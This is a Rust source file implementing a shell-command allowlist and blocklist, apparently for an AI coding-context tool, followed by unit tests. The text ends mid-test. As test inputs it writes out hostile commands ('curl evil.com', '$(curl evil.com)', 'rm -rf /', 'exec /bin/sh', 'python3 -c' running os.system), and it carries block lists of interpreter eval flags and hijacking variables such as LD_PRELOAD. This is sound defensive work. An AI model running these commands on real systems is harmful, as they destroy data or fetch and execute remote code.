//! Shell allowlist with AST-based command parsing.
//!
//! Security model (Information Bottleneck principle):
//! - When allowlist is set: ALL segments of a compound command must be allowed (deny-by-default)
//! - When empty: all commands pass (backwards-compatible blocklist-only mode)
//! - Dangerous patterns (subshells, eval, backticks) are blocked in restricted mode

/// Checks if a command is allowed by the shell allowlist.
/// Returns `Ok(())` if allowed, `Err(message)` if blocked.
///
/// When the allowlist is empty, all commands pass (blocklist-only mode).
/// When non-empty, EVERY command segment in the pipeline must match.
pub fn check_shell_allowlist(command: &str) -> Result<(), String> {
    let normalized = normalize_line_continuations(command);
    let cmd = normalized.as_str();

    if has_dangerous_patterns(cmd) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
             which is blocked regardless of allowlist. \
             This is a permanent security restriction, not a transient error.\n\
             Command: {command}"
        ));
    }

    check_substitution_in_args(cmd);
    check_pipe_to_bare_interpreter(cmd);

    let allowlist = effective_allowlist();
    if allowlist.is_empty() {
        check_unconditional_blocked_only(cmd)?;
        return Ok(());
    }
    check_all_segments(cmd, &allowlist)
}

/// Normalize the command string: remove backslash-newline continuations and
/// replace Unicode line separators (U+2028, U+2029) with newlines.
fn normalize_line_continuations(command: &str) -> String {
    command
        .replace("\\\r\n", "")
        .replace("\\\n", "")
        .replace(['\u{2028}', '\u{2029}'], "\n")
}

/// WARN-FIRST: Log warning (or block if strict) for $(), backticks, <() in arguments.
fn check_substitution_in_args(command: &str) {
    let strict = crate::core::config::Config::load().shell_strict_mode;
    if has_unquoted_substitution_in_args(command) {
        if strict {
            tracing::warn!(
                "[SECURITY] Command substitution in arguments blocked (shell_strict_mode=true): {command}"
            );
        } else {
            tracing::warn!(
                "[SECURITY] Command substitution in arguments detected (warn-only, set shell_strict_mode=true to block): {command}"
            );
        }
    }
}

/// Check for $(), backticks, <(, >( outside of command position, outside quotes.
fn has_unquoted_substitution_in_args(command: &str) -> bool {
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut past_first_token = false;
    let mut seen_space_after_cmd = false;

    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            if ch == b'"' && (i == 0 || bytes[i - 1] != b'\\') {
                in_double_quote = false;
            }
            i += 1;
            continue;
        }
        match ch {
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b' ' | b'\t' if !past_first_token => {
                seen_space_after_cmd = true;
                i += 1;
            }
            _ if !seen_space_after_cmd => {
                i += 1;
            }
            _ => {
                past_first_token = true;
                if ch == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
                if ch == b'`' {
                    return true;
                }
                if (ch == b'<' || ch == b'>') && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
                i += 1;
            }
        }
    }
    false
}

/// WARN-FIRST: Log warning for piping into bare interpreter (no script file).
fn check_pipe_to_bare_interpreter(command: &str) {
    let segments = split_on_operators(command);
    let pipe_indices: Vec<usize> = {
        let mut indices = Vec::new();
        let bytes = command.as_bytes();
        let len = bytes.len();
        let mut j = 0;
        let mut in_sq = false;
        let mut in_dq = false;
        while j < len {
            if in_sq {
                if bytes[j] == b'\'' {
                    in_sq = false;
                }
                j += 1;
                continue;
            }
            if in_dq {
                if bytes[j] == b'"' && (j == 0 || bytes[j - 1] != b'\\') {
                    in_dq = false;
                }
                j += 1;
                continue;
            }
            match bytes[j] {
                b'\'' => {
                    in_sq = true;
                    j += 1;
                }
                b'"' => {
                    in_dq = true;
                    j += 1;
                }
                b'|' if j + 1 < len && bytes[j + 1] != b'|' => {
                    indices.push(j);
                    j += 1;
                }
                _ => {
                    j += 1;
                }
            }
        }
        indices
    };
    let _ = pipe_indices;

    for (idx, seg) in segments.iter().enumerate() {
        if idx == 0 {
            continue;
        }
        if is_bare_interpreter_stdin(seg) {
            let base = extract_base_from_segment(seg);
            let strict = crate::core::config::Config::load().shell_strict_mode;
            if strict {
                tracing::warn!(
                    "[SECURITY] Pipe to bare interpreter '{base}' blocked (shell_strict_mode=true)"
                );
            } else {
                tracing::warn!("[SECURITY] Pipe to bare interpreter '{base}' detected (warn-only)");
            }
        }
    }
}

/// For empty allowlists: still enforce UNCONDITIONAL_BLOCKED commands.
fn check_unconditional_blocked_only(command: &str) -> Result<(), String> {
    let segments = extract_all_commands(command);
    for seg in &segments {
        let base = extract_base_from_segment(seg);
        if !base.is_empty() && UNCONDITIONAL_BLOCKED.contains(&base.as_str()) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] '{base}' is unconditionally blocked \
                 regardless of allowlist configuration.\n\
                 Command: {command}"
            ));
        }
        check_inline_env_block(seg)?;
        check_interpreter_eval_only(seg)?;
        check_dangerous_flags(seg)?;
    }
    Ok(())
}

/// Like `check_interpreter_abuse` but only checks for eval flags on interpreters.
/// Skips delegation-command checks (which require an allowlist for membership test).
/// Used in blocklist-only mode where there is no allowlist.
fn check_interpreter_eval_only(segment: &str) -> Result<(), String> {
    let trimmed = skip_env_assignments(segment.trim());
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }
    let base = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);
    if !INTERPRETER_COMMANDS.contains(&base) {
        return Ok(());
    }
    for &tok in &tokens[1..] {
        if EVAL_FLAGS.contains(&tok) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with inline code execution \
                 flag '{tok}' is blocked. Use a script file instead.\n\
                 This is a permanent security restriction."
            ));
        }
        if has_eval_flag_prefix(tok) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with combined flag '{tok}' \
                 containing eval flag is blocked.\n\
                 This is a permanent security restriction."
            ));
        }
    }
    if tokens[1..].iter().any(|t| t.contains("<<")) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with heredoc stdin is blocked. \
             Use a script file instead.\n\
             This is a permanent security restriction."
        ));
    }
    Ok(())
}

/// Commands that are unconditionally blocked regardless of allowlist membership.
/// These provide direct arbitrary code execution or re-enter the shell.
const UNCONDITIONAL_BLOCKED: &[&str] = &["eval", "exec", "source", "."];

/// Interpreters that can execute arbitrary code via -c/-e flags.
const INTERPRETER_COMMANDS: &[&str] = &[
    "python", "python3", "python2", "node", "ruby", "perl", "lua", "php", "bash", "sh", "zsh",
    "fish", "dash", "ksh",
];

/// Flags that indicate inline code execution for interpreters.
const EVAL_FLAGS: &[&str] = &[
    "-c", "-e", "-r", "-p", "--eval", "--exec", "-exec", "--print", "--run",
];

/// Script file extensions that indicate a file argument (not stdin execution).
const SCRIPT_EXTENSIONS: &[&str] = &[
    ".py", ".rb", ".js", ".ts", ".pl", ".lua", ".php", ".sh", ".bash", ".zsh", ".mjs", ".cjs",
    ".tsx", ".jsx",
];

/// Commands that delegate to another command (the delegated command must also be allowed).
const DELEGATION_COMMANDS: &[&str] = &["env", "nice", "timeout", "sudo", "doas"];

/// Check if a segment uses an interpreter with an eval flag, or a delegation command
/// whose target is not in the allowlist.
fn check_interpreter_abuse(segment: &str, allowlist: &[String]) -> Result<(), String> {
    check_interpreter_abuse_inner(segment, allowlist, 0)
}

fn check_interpreter_abuse_inner(
    segment: &str,
    allowlist: &[String],
    depth: usize,
) -> Result<(), String> {
    if depth > 3 {
        return Ok(());
    }
    let trimmed = skip_env_assignments(segment.trim());
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }

    let base = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);

    if INTERPRETER_COMMANDS.contains(&base) {
        for &tok in &tokens[1..] {
            if EVAL_FLAGS.contains(&tok) {
                return Err(format!(
                    "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with inline code execution \
                     flag '{tok}' is blocked. Use a script file instead.\n\
                     This is a permanent security restriction."
                ));
            }
            if has_eval_flag_prefix(tok) {
                return Err(format!(
                    "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with combined flag '{tok}' \
                     containing eval flag is blocked.\n\
                     This is a permanent security restriction."
                ));
            }
        }
        if tokens[1..].iter().any(|t| t.contains("<<")) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with heredoc stdin is blocked. \
                 Use a script file instead.\n\
                 This is a permanent security restriction."
            ));
        }
    }

    if DELEGATION_COMMANDS.contains(&base) {
        let rest_tokens: Vec<&str> = tokens[1..]
            .iter()
            .skip_while(|t| t.starts_with('-') || t.contains('='))
            .copied()
            .collect();
        if let Some(&delegated_tok) = rest_tokens.first() {
            let delegated = delegated_tok.rsplit('/').next().unwrap_or(delegated_tok);
            if !delegated.is_empty() && !allowlist.iter().any(|a| a == delegated) {
                return Err(format!(
                    "[BLOCKED — DO NOT RETRY] '{base}' delegates to '{delegated}' which is not \
                     in the shell allowlist. This is a permanent restriction."
                ));
            }
            let rest_str = rest_tokens.join(" ");
            check_interpreter_abuse_inner(&rest_str, allowlist, depth + 1)?;
        }
    }

    Ok(())
}

/// Check for combined flags like -pe, -ne, -ce that contain eval characters.
fn has_eval_flag_prefix(token: &str) -> bool {
    if !token.starts_with('-') || token.starts_with("--") || token.len() < 3 {
        return false;
    }
    let flag_chars = &token[1..];
    let eval_chars = ['c', 'e', 'r', 'p'];
    flag_chars.chars().any(|c| eval_chars.contains(&c))
}

/// Check if a segment is a bare interpreter after a pipe (no script file argument).
fn is_bare_interpreter_stdin(segment: &str) -> bool {
    let trimmed = skip_env_assignments(segment.trim());
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return false;
    }
    let base = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);
    if !INTERPRETER_COMMANDS.contains(&base) {
        return false;
    }
    !tokens[1..]
        .iter()
        .any(|t| !t.starts_with('-') && SCRIPT_EXTENSIONS.iter().any(|ext| t.ends_with(ext)))
}

/// Dangerous flag patterns for specific commands.
const DANGEROUS_GIT_FLAGS: &[&str] = &[
    "--upload-pack",
    "--receive-pack",
    "--config=core.sshcommand",
    "--config=core.gitproxy",
];

const DANGEROUS_TAR_FLAGS: &[&str] = &["--to-command", "--use-compress-program"];

/// Blocked inline environment assignments that can hijack execution.
const BLOCKED_INLINE_ENV: &[&str] = &[
    "PATH=",
    "GIT_ASKPASS=",
    "GIT_SSH=",
    "GIT_SSH_COMMAND=",
    "GIT_EDITOR=",
    "GIT_EXTERNAL_DIFF=",
    "SSH_ASKPASS=",
    "LD_PRELOAD=",
    "DYLD_INSERT_LIBRARIES=",
];

fn check_dangerous_flags(segment: &str) -> Result<(), String> {
    let trimmed = skip_env_assignments(segment.trim());
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }
    let base = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);

    match base {
        "git" => {
            for &tok in &tokens[1..] {
                for flag in DANGEROUS_GIT_FLAGS {
                    if tok.starts_with(flag) {
                        return Err(format!(
                            "[BLOCKED — DO NOT RETRY] 'git' with dangerous flag '{tok}' is blocked.\n\
                             This is a permanent security restriction."
                        ));
                    }
                }
            }
        }
        "tar" => {
            for &tok in &tokens[1..] {
                for flag in DANGEROUS_TAR_FLAGS {
                    if tok.starts_with(flag) {
                        return Err(format!(
                            "[BLOCKED — DO NOT RETRY] 'tar' with dangerous flag '{tok}' is blocked.\n\
                             This is a permanent security restriction."
                        ));
                    }
                }
            }
        }
        "find" => {
            for &tok in &tokens[1..] {
                if tok == "-exec" || tok == "-execdir" {
                    return Err(format!(
                        "[BLOCKED — DO NOT RETRY] 'find' with '{tok}' is blocked. \
                         Use 'find ... -print' and pipe to xargs instead.\n\
                         This is a permanent security restriction."
                    ));
                }
            }
        }
        "awk" | "gawk" | "mawk" => {
            for &tok in &tokens[1..] {
                if tok.contains("system(") {
                    return Err(format!(
                        "[BLOCKED — DO NOT RETRY] '{base}' with 'system()' call is blocked.\n\
                         This is a permanent security restriction."
                    ));
                }
            }
        }
        _ => {}
    }
    Ok(())
}

fn check_inline_env_block(segment: &str) -> Result<(), String> {
    let trimmed = segment.trim();
    for blocked in BLOCKED_INLINE_ENV {
        if trimmed.starts_with(blocked) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] Inline environment override '{blocked}' is blocked.\n\
                 This is a permanent security restriction."
            ));
        }
    }
    Ok(())
}

fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String> {
    if allowlist.is_empty() {
        return Ok(());
    }

    if has_dangerous_patterns(command) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
             which is blocked in restricted mode. \
             This is a permanent security restriction, not a transient error.\n\
             Command: {command}"
        ));
    }

    let segments = extract_all_commands(command);
    if segments.is_empty() {
        return Err("[BLOCKED — DO NOT RETRY] Empty command".to_string());
    }

    for seg in &segments {
        check_inline_env_block(seg)?;
        let base = extract_base_from_segment(seg);
        if base.is_empty() {
            continue;
        }
        if UNCONDITIONAL_BLOCKED.contains(&base.as_str()) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] '{base}' is unconditionally blocked \
                 regardless of allowlist membership. \
                 This is a permanent security restriction.\n\
                 Command: {command}"
            ));
        }
        check_interpreter_abuse(seg, allowlist)?;
        check_dangerous_flags(seg)?;
        if !allowlist.iter().any(|a| a == &base) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] '{base}' is not in the shell allowlist. \
                 This is a permanent restriction, not a transient error.\n\
                 Fix: add '{base}' to shell_allowlist in ~/.lean-ctx/config.toml\n\
                 Or disable the allowlist: shell_allowlist = []\n\
                 Do NOT retry this command — it will fail again with the same error."
            ));
        }
    }
    Ok(())
}

/// Detect dangerous shell patterns that bypass allowlist intent.
///
/// Only blocks patterns that are genuinely dangerous at command position.
/// `$()` and backticks in *arguments* are allowed — the base command is
/// already validated by the allowlist, and blocking substitutions in
/// arguments breaks legitimate workflows (e.g. `git commit -m "$(cat ...)"`,
/// pre-commit hooks, playwright scripts).
fn has_dangerous_patterns(command: &str) -> bool {
    let trimmed = command.trim();

    for blocked in UNCONDITIONAL_BLOCKED {
        let with_space = format!("{blocked} ");
        if trimmed.starts_with(&with_space) {
            return true;
        }
        for sep in ["; ", "&& ", "|| ", "| ", "\n"] {
            if trimmed.contains(&format!("{sep}{blocked} ")) {
                return true;
            }
        }
    }

    if has_substitution_at_command_pos(trimmed) {
        return true;
    }

    false
}

/// Check if `$()` or backticks appear at command position (first token
/// of any segment). Substitutions in *arguments* are intentionally
/// allowed — the security boundary is the base-command allowlist check.
fn has_substitution_at_command_pos(command: &str) -> bool {
    let segments = split_on_operators(command);
    for seg in segments {
        let trimmed = seg.trim();
        let cmd_start = skip_env_assignments(trimmed);

        if cmd_start.starts_with("$(") {
            return true;
        }

        let first_token = cmd_start.split_whitespace().next().unwrap_or("");
        if first_token.starts_with('`') || first_token == "`" {
            return true;
        }
    }
    false
}

/// Extract ALL command segments from a compound shell command.
/// Splits on: &&, ||, ;, | (pipe), and handles subshell grouping.
fn extract_all_commands(command: &str) -> Vec<String> {
    split_on_operators(command)
        .into_iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Split command string on shell operators: ;, &&, ||, |
/// Respects single/double quotes and parentheses nesting.
fn split_on_operators(command: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut paren_depth: u32 = 0;

    while i < len {
        let ch = bytes[i];

        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }

        if in_double_quote {
            if ch == b'"' && (i == 0 || bytes[i - 1] != b'\\') {
                in_double_quote = false;
            }
            i += 1;
            continue;
        }

        match ch {
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                paren_depth += 1;
                i += 1;
            }
            b')' => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b'\n' | b'\r' | b';' if paren_depth == 0 => {
                segments.push(&command[start..i]);
                i += 1;
                start = i;
            }
            b'&' if paren_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'&' {
                    // &&
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else {
                    // single & (background operator) — still a command separator
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            b'|' if paren_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'|' {
                    // ||
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else {
                    // pipe
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    if start < len {
        segments.push(&command[start..]);
    }

    segments
}

/// Extract the base command name from a single segment (no operators).
fn extract_base_from_segment(segment: &str) -> String {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    let cmd_part = skip_env_assignments(trimmed);
    if cmd_part.is_empty() {
        return String::new();
    }

    // Take first whitespace-delimited token as the command
    let first_token = cmd_part.split_whitespace().next().unwrap_or("");

    // Strip path prefix: /usr/bin/git -> git
    first_token
        .rsplit('/')
        .next()
        .unwrap_or(first_token)
        .to_string()
}

/// Skip leading KEY=VALUE environment variable assignments.
fn skip_env_assignments(segment: &str) -> &str {
    let mut rest = segment;
    loop {
        let token = rest.split_whitespace().next().unwrap_or("");
        if token.is_empty() {
            return rest;
        }
        // env var assignment: contains '=' and doesn't start with '-' or '/'
        if token.contains('=')
            && !token.starts_with('-')
            && !token.starts_with('/')
            && !token.starts_with('.')
        {
            // Advance past this token
            let after = &rest[rest.find(token).unwrap_or(0) + token.len()..];
            rest = after.trim_start();
        } else {
            return rest;
        }
    }
}

fn effective_allowlist() -> Vec<String> {
    let mut list = crate::core::config::Config::load().shell_allowlist;
    if let Ok(env_val) = std::env::var("LEAN_CTX_SHELL_ALLOWLIST") {
        for entry in env_val
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
        {
            if !list.contains(&entry) {
                list.push(entry);
            }
        }
    }
    list
}

/// Public accessor for extracting all command segments.
pub fn extract_all_commands_pub(command: &str) -> Vec<String> {
    extract_all_commands(command)
}

// Legacy compat: single-segment extraction (used by other callers)
pub fn extract_base_command(command: &str) -> String {
    let first_seg = split_on_operators(command)
        .into_iter()
        .next()
        .unwrap_or(command);
    extract_base_from_segment(first_seg)
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_base_command tests (legacy compat) ---

    #[test]
    fn extract_simple_command() {
        assert_eq!(extract_base_command("git status"), "git");
    }

    #[test]
    fn extract_with_path() {
        assert_eq!(extract_base_command("/usr/bin/git log"), "git");
    }

    #[test]
    fn extract_with_env_assignment() {
        assert_eq!(extract_base_command("LANG=en_US git log"), "git");
    }

    #[test]
    fn extract_chained_commands() {
        assert_eq!(extract_base_command("cd /tmp && ls -la"), "cd");
    }

    #[test]
    fn extract_piped_command() {
        assert_eq!(extract_base_command("grep foo | wc -l"), "grep");
    }

    #[test]
    fn extract_semicolon_chain() {
        assert_eq!(extract_base_command("echo hello; rm -rf /"), "echo");
    }

    #[test]
    fn extract_empty_command() {
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn extract_whitespace_only() {
        assert_eq!(extract_base_command("   "), "");
    }

    #[test]
    fn extract_multiple_env_vars() {
        assert_eq!(extract_base_command("FOO=bar BAZ=qux cargo test"), "cargo");
    }

    // --- All-segments validation tests ---

    fn allow(cmds: &[&str]) -> Vec<String> {
        cmds.iter().map(std::string::ToString::to_string).collect()
    }

    #[test]
    fn allowlist_empty_always_passes() {
        assert!(check_all_segments("anything", &[]).is_ok());
    }

    #[test]
    fn allowlist_blocks_unlisted() {
        let list = allow(&["git", "cargo"]);
        let result = check_all_segments("npm install", &list);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("npm"));
    }

    #[test]
    fn allowlist_allows_listed() {
        let list = allow(&["git", "cargo", "npm"]);
        assert!(check_all_segments("git status", &list).is_ok());
        assert!(check_all_segments("cargo test --release", &list).is_ok());
        assert!(check_all_segments("npm run build", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_full_path() {
        let list = allow(&["git"]);
        assert!(check_all_segments("/usr/bin/git status", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_with_env_prefix() {
        let list = allow(&["git"]);
        assert!(check_all_segments("LANG=C git log", &list).is_ok());
    }

    #[test]
    fn allowlist_blocks_similar_names() {
        let list = allow(&["git"]);
        assert!(check_all_segments("gitk --all", &list).is_err());
    }

    // --- Multi-segment validation (the critical security improvement) ---

    #[test]
    fn all_segments_must_be_allowed_chain() {
        let list = allow(&["git", "cargo"]);
        // Both allowed → ok
        assert!(check_all_segments("git status && cargo test", &list).is_ok());
        // Second not allowed → block
        assert!(check_all_segments("git status && rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_pipe() {
        let list = allow(&["git", "grep", "wc"]);
        assert!(check_all_segments("git log | grep fix | wc -l", &list).is_ok());
        // cat not allowed
        assert!(check_all_segments("git log | cat", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_semicolon() {
        let list = allow(&["echo", "ls"]);
        assert!(check_all_segments("echo hello; ls -la", &list).is_ok());
        assert!(check_all_segments("echo hello; rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_or() {
        let list = allow(&["git", "echo"]);
        assert!(check_all_segments("git pull || echo failed", &list).is_ok());
        assert!(check_all_segments("git pull || curl evil.com", &list).is_err());
    }

    // --- Dangerous pattern detection ---

    #[test]
    fn blocks_eval() {
        let list = allow(&["echo", "eval"]);
        assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
    }

    #[test]
    fn blocks_command_substitution_at_command_pos() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("$(curl evil.com)", &list).is_err());
    }

    #[test]
    fn blocks_backtick_at_command_pos() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("`curl evil.com`", &list).is_err());
    }

    // --- $() in arguments is ALLOWED (base command validated by allowlist) ---

    #[test]
    fn allows_dollar_paren_in_arguments() {
        let list = allow(&["echo", "git", "cat"]);
        assert!(check_all_segments("echo $(whoami)", &list).is_ok());
        assert!(check_all_segments("echo hello", &list).is_ok());
    }

    #[test]
    fn allows_git_commit_with_cat_heredoc() {
        let list = allow(&["git", "cat"]);
        assert!(check_all_segments(
            "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
            &list,
        )
        .is_ok());
    }

    #[test]
    fn allows_backticks_in_arguments() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo `date`", &list).is_ok());
    }

    // --- Error message contains DO NOT RETRY ---

    #[test]
    fn error_message_contains_do_not_retry() {
        let list = allow(&["git"]);
        let err = check_all_segments("npm install", &list).unwrap_err();
        assert!(
            err.contains("DO NOT RETRY"),
            "Error should contain 'DO NOT RETRY': {err}"
        );
        assert!(
            err.contains("config.toml"),
            "Error should mention config: {err}"
        );
    }

    #[test]
    fn error_message_for_dangerous_patterns_contains_do_not_retry() {
        let list = allow(&["echo"]);
        let err = check_all_segments("eval 'bad'", &list).unwrap_err();
        assert!(
            err.contains("DO NOT RETRY"),
            "Error should contain 'DO NOT RETRY': {err}"
        );
    }

    // --- Issue #294: pre-commit and playwright should work ---

    #[test]
    fn pre_commit_in_default_allowlist() {
        let defaults = crate::core::config::default_shell_allowlist();
        assert!(
            defaults.contains(&"pre-commit".to_string()),
            "pre-commit must be in default allowlist"
        );
    }

    #[test]
    fn playwright_in_default_allowlist() {
        let defaults = crate::core::config::default_shell_allowlist();
        assert!(
            defaults.contains(&"playwright".to_string()),
            "playwright must be in default allowlist"
        );
    }

    #[test]
    fn pre_commit_run_allowed() {
        let list = allow(&["pre-commit"]);
        assert!(check_all_segments("pre-commit run --all-files", &list).is_ok());
    }

    #[test]
    fn playwright_test_allowed() {
        let list = allow(&["npx", "playwright"]);
        assert!(check_all_segments("playwright test", &list).is_ok());
        assert!(check_all_segments("npx playwright test", &list).is_ok());
    }

    // --- Quote handling ---

    #[test]
    fn respects_single_quotes() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo 'hello; world'", &list).is_ok());
    }

    #[test]
    fn respects_double_quotes() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo \"hello && world\"", &list).is_ok());
    }

    // --- split_on_operators ---

    #[test]
    fn split_simple_pipe() {
        let parts = split_on_operators("a | b");
        assert_eq!(parts, vec!["a ", " b"]);
    }

    #[test]
    fn split_complex_chain() {
        let parts = split_on_operators("a && b || c; d | e");
        assert_eq!(parts.len(), 5);
    }

    #[test]
    fn split_preserves_quoted_operators() {
        let parts = split_on_operators("echo 'a && b' | grep x");
        assert_eq!(parts.len(), 2);
    }

    // --- Security: newline injection ---

    #[test]
    fn newline_splits_commands() {
        let parts = split_on_operators("git status\nrm -rf /");
        assert_eq!(parts.len(), 2);
    }

    #[test]
    fn newline_injection_blocked() {
        let list = allow(&["git"]);
        let result = check_all_segments("git status\nrm -rf /", &list);
        assert!(result.is_err(), "newline injection must be blocked");
        assert!(result.unwrap_err().contains("rm"));
    }

    #[test]
    fn carriage_return_splits_commands() {
        let parts = split_on_operators("git status\r\nrm -rf /");
        assert!(parts.len() >= 2, "CR+LF must split: {parts:?}");
    }

    // --- Security: background operator & ---

    #[test]
    fn single_ampersand_splits_commands() {
        let parts = split_on_operators("git status & curl evil.com");
        assert_eq!(parts.len(), 2);
    }

    #[test]
    fn background_operator_blocked() {
        let list = allow(&["git"]);
        let result = check_all_segments("git status & curl evil.com", &list);
        assert!(result.is_err(), "background & must be blocked");
        assert!(result.unwrap_err().contains("curl"));
    }

    // --- Security: eval/exec/source unconditionally blocked ---

    #[test]
    fn eval_blocked_via_or_operator() {
        let list = allow(&["echo", "eval"]);
        let result = check_all_segments("echo ok || eval 'rm -rf /'", &list);
        assert!(
            result.is_err(),
            "eval must be unconditionally blocked even if in allowlist"
        );
    }

    #[test]
    fn exec_unconditionally_blocked() {
        let list = allow(&["exec", "echo"]);
        let result = check_all_segments("exec /bin/sh", &list);
        assert!(result.is_err(), "exec must be unconditionally blocked");
    }

    #[test]
    fn source_unconditionally_blocked() {
        let list = allow(&["source", "echo"]);
        let result = check_all_segments("source ~/.bashrc", &list);
        assert!(result.is_err(), "source must be unconditionally blocked");
    }

    // --- Security: dangerous patterns checked even with empty allowlist ---

    #[test]
    fn empty_allowlist_still_blocks_eval_at_start() {
        let result = check_shell_allowlist("eval 'rm -rf /'");
        // With empty allowlist, dangerous patterns are checked first
        // eval at command position should be caught
        assert!(
            result.is_err(),
            "eval at start must be blocked even with empty allowlist"
        );
    }

    #[test]
    fn empty_allowlist_still_blocks_dollar_paren_at_start() {
        let result = check_shell_allowlist("$(curl evil.com)");
        assert!(
            result.is_err(),
            "$() at command position must be blocked even with empty allowlist"
        );
    }

    // --- Security: interpreter abuse ---

    #[test]
    fn python_c_blocked() {
        let list = allow(&["python3"]);
        let result = check_all_segments("python3 -c 'import os; os.system(\"id\")'", &list);
        assert!(result.is_err(), "python3 -c must be blocked");
    }

    #[test]
    fn node_e_blocked() {
        let list = allow(&["node"]);
        let result = check_all_segments("node -e 'process.exit(1)'", &list);
        assert!(result.is_err(), "node -e must be blocked");
    }

    #[test]
    fn python_script_allowed() {
        let list = allow(&["python3"]);
        let result = check_all_segments("python3 script.py", &list);
        assert!(result.is_ok(), "python3 with script file must be allowed");
    }

    #[test]
    fn env_delegates_to_unlisted_blocked() {
        let list = allow(&["env", "git"]);
        let result = check_all_segments("env /bin/sh -c 'id'", &list);
        assert!(
            result.is_err(),
            "env delegating to unlisted command must be blocked"
        );
    }

    #[test]
    fn env_delegates_to_listed_allowed() {
        let list = allow(&["env", "git"]);
        let result = check_all_segments("env git status", &list);
        assert!(
            result.is_ok(),
            "env delegating to listed command must be allowed"
        );
    }

    // --- Security: env override is additive ---

    #[test]
    fn env_override_is_additive() {
        let base_list = crate::core::config::default_shell_allowlist();
        assert!(base_list.contains(&"git".to_string()));
    }

    // --- Phase 1 V2: SAFE checks ---

    #[test]
    fn dot_source_alias_blocked() {
        let list = allow(&["echo"]);
        let result = check_all_segments(". ~/.bashrc", &list);
        assert!(result.is_err(), ". (source alias) must be blocked");
    }

    #[test]
    fn backslash_newline_normalized() {
        let normalized = normalize_line_continuations("echo ok && \\\ncurl evil");
        assert!(
            !normalized.contains('\n'),
            "backslash-newline must be removed"
        );
        assert!(
            normalized.contains("curl"),
            "content after continuation must be preserved"
        );
    }

    #[test]
    fn delegation_recursive_interpreter_check() {
        let list = allow(&["env", "python3"]);
        let result = check_all_segments("env python3 -c 'import os'", &list);
        assert!(
            result.is_err(),
            "env python3 -c must be blocked via recursive check"
        );
    }

    #[test]
    fn delegation_recursive_normal_allowed() {
        let list = allow(&["env", "git"]);
        let result = check_all_segments("env git status", &list);
        assert!(result.is_ok(), "env git status must be allowed");
    }

    #[test]
    fn eval_flags_extended_r() {
        let list = allow(&["php"]);
        let result = check_all_segments("php -r 'system(\"id\")'", &list);
        assert!(result.is_err(), "php -r must be blocked");
    }

    #[test]
    fn eval_flags_extended_p() {
        let list = allow(&["node"]);
        let result = check_all_segments("node -p 'process.exit(1)'", &list);
        assert!(result.is_err(), "node -p must be blocked");
    }

    #[test]
    fn combined_flags_pe_blocked() {
        let list = allow(&["perl"]);
